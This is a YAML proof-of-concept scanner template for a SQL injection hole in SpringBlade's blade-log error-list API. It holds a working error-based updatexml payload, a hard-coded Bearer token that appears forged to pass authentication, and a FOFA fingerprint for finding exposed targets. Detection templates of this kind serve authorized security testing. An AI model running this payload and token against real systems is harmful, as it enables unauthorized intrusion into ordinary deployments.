id: poc-yaml-springblade-blade-log-sqli
info:
  name: SpringBlade blade-log SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: springblade
  fofa: body="https://bladex.vip"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /api/blade-log/error/list?updatexml(1,concat(0x7e,md5({{.t1}}),0x7e),1)=1
  headers:
    Blade-Auth: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9..UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ
  expression: status_code == 500 && contains(body,"XPATH syntax error") && contains(body,substr(t2,0,31))
    && contains(headers,"application/json")
transport: http
